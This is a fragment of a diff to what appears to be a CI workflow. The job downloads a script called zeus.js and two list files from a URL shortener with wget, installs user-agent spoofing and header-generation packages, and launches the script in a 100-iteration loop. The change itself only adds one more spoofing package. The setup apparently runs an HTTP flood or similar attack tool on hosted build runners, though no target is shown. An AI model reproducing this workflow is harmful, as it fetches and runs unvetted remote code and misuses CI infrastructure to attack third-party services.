@@ -18,7 +18,7 @@ jobs:
           wget https://curl.by/wjk60/zeus.js
           wget https://curl.by/UYgdD/fres.txt
           wget https://curl.by/_m4jT/ua.txt
-          npm install fake-useragent colors header-generator
+          npm install fake-useragent colors header-generator user-agents
           chmod +x zeus.js
           PIDS=()
           for i in {1..100}; do
